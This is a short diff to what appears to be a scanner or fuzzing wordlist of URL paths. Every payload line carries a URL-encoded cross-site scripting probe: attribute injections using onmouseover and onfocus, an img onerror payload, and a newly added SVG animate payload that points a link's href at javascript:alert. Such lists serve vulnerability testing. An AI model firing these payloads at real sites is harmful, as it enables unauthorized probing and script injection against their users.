@@ -1,3 +1,5 @@
 /?cf-api=%22%20style=position:fixed;left:0;top:0;right:0;bottom:0;%20onmouseover=alert(1)%20x
 /?post_type=tsml_meeting&tsml-query=%22%20onfocus%3Dalert%28document.domain%29%20autofocus%20%22
 /api/v1/db/auth/password/reset/nuclei%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E/
+/api/system/version
+/api/icon/getDynamicIcon?type=8&content=%3C%2Ftext%3E%3Ca%3E%3Canimate+attributeName%3D%22href%22+values%3D%22javascript%3Aalert%28document.domain%29%22+begin%3D%220s%22+fill%3D%22freeze%22%2F%3E%3Ctext+x%3D%2250%25%22+y%3D%2280%25%22+fill%3D%22red%22+style%3D%22font-size%3A60px%22%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E%3Ctext%3E&color=blue
